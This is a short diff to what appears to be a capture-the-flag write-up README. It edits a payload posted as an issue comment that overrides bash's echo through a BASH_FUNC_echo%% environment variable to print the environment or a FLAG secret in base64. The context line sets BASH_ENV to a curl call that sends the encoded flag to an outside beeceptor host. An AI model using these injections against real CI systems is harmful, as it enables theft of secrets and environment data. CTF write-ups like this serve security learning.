@@ -153,7 +153,8 @@ BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base6
 Body Issue Comment:
 ``` bash
 Let me do something with this env :)
-BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
+# BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
+BASH_FUNC_echo%%=() { builtin echo "$FLAG $@" | base64 ;}
 ```
  <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
